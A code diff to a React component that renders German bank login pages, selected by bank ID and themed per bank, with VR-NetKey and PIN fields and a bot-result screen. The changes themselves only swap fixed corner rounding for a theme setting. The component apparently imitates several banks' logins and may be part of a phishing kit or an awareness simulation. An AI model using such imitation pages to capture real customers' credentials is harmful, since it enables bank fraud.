@@ -554,7 +554,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
   if (phase === "result") {
     return (
       <BankShell {...shellProps}>
-        <BotResultScreen themeColor={themeColor} result={result} />
+        <BotResultScreen themeColor={themeColor} result={result} buttonRadius={theme.buttonRadius} />
       </BankShell>
     );
   }
@@ -563,7 +563,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
     <BankShell {...shellProps}>
       <div className="max-w-6xl mx-auto flex flex-col lg:flex-row gap-6">
         <div className="w-full lg:w-1/2 flex flex-col gap-4">
-          <div className="bg-white rounded-xl shadow-md border border-gray-200 overflow-hidden">
+          <div className="bg-white shadow-md border border-gray-200 overflow-hidden" style={{ borderRadius: theme.buttonRadius === "rounded-none" ? "0px" : "12px" }}>
             <div className="p-6 sm:p-8">
               <h2 className="text-2xl sm:text-3xl font-bold mb-4" style={{ color: themeColor }}>
                 Anmelden
@@ -579,7 +579,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
               </div>
 
               {errorMsg && (
-                <div className="mb-4 rounded-lg bg-red-50 border border-red-200 p-4 flex items-start gap-2">
+                <div className="mb-4 bg-red-50 border border-red-200 p-4 flex items-start gap-2" style={{ borderRadius: theme.buttonRadius }}>
                   <AlertCircle className="w-4 h-4 mt-0.5 text-red-600 shrink-0" />
                   <p className="text-sm text-red-600 font-medium">{errorMsg}</p>
                 </div>
@@ -587,15 +587,15 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
 
               <form onSubmit={handleSubmit} className="space-y-4">
                 <div>
-                  <div className={`relative rounded-lg ${vrNetKeyError ? "bg-red-50" : ""}`}>
+                  <div className={`relative ${vrNetKeyError ? "bg-red-50" : ""}`} style={{ borderRadius: theme.buttonRadius }}>
                     <input
                       id="vrNetKey"
                       type="text"
                       value={vrNetKey}
                       onChange={(e) => { setVrNetKey(e.target.value); if (e.target.value.trim()) setVrNetKeyError(false); setCredentialsInvalid(false); setErrorMsg(null); }}
                       placeholder=" "
-                      className={`peer w-full px-4 pt-6 pb-2 border-2 rounded-lg focus:outline-none transition-colors text-base bg-transparent ${vrNetKeyError ? "border-red-500" : "border-gray-300"}`}
-                      style={!vrNetKeyError && vrNetKey ? { borderColor: theme.accentText } : undefined}
+                      className={`peer w-full px-4 pt-6 pb-2 border-2 focus:outline-none transition-colors text-base bg-transparent ${vrNetKeyError ? "border-red-500" : "border-gray-300"}`}
+                      style={{ ...(!vrNetKeyError && vrNetKey ? { borderColor: theme.accentText } : {}), borderRadius: theme.buttonRadius }}
                       autoComplete="username"
                     />
                     <label
@@ -615,15 +615,15 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                 </div>
 
                 <div>
-                  <div className={`relative rounded-lg ${pinError ? "bg-red-50" : ""}`}>
+                  <div className={`relative ${pinError ? "bg-red-50" : ""}`} style={{ borderRadius: theme.buttonRadius }}>
                     <input
                       id="pin"
                       type={showPin ? "text" : "password"}
                       value={pin}
                       onChange={(e) => { setPin(e.target.value); if (e.target.value.trim()) setPinError(false); setCredentialsInvalid(false); setErrorMsg(null); }}
                       placeholder=" "
-                      className={`peer w-full px-4 pt-6 pb-2 pr-12 border-2 rounded-lg focus:outline-none transition-colors text-base bg-transparent ${pinError ? "border-red-500" : "border-gray-300"}`}
-                      style={!pinError && pin ? { borderColor: theme.accentText } : undefined}
+                      className={`peer w-full px-4 pt-6 pb-2 pr-12 border-2 focus:outline-none transition-colors text-base bg-transparent ${pinError ? "border-red-500" : "border-gray-300"}`}
+                      style={{ ...(!pinError && pin ? { borderColor: theme.accentText } : {}), borderRadius: theme.buttonRadius }}
                       autoComplete="current-password"
                     />
                     <label
@@ -680,7 +680,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
             </div>
           </div>
 
-          <div className="bg-white rounded-xl shadow-md border border-gray-200 p-6">
+          <div className="bg-white shadow-md border border-gray-200 p-6" style={{ borderRadius: theme.buttonRadius === "rounded-none" ? "0px" : "12px" }}>
             <h3 className="font-bold text-sm text-gray-800 mb-3">Wichtiger Hinweis:</h3>
             <ul className="list-disc pl-5 space-y-2 text-sm text-gray-600">
               <li>
@@ -692,7 +692,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
         </div>
 
         <div className="hidden lg:block w-full lg:w-1/2">
-          <div className="bg-white rounded-xl shadow-md border border-gray-200 p-8 h-full">
+          <div className="bg-white shadow-md border border-gray-200 p-8 h-full" style={{ borderRadius: theme.buttonRadius === "rounded-none" ? "0px" : "12px" }}>
             <h3 className="text-xl font-bold mb-3" style={{ color: themeColor }}>
               Sicher im Online-Banking
             </h3>
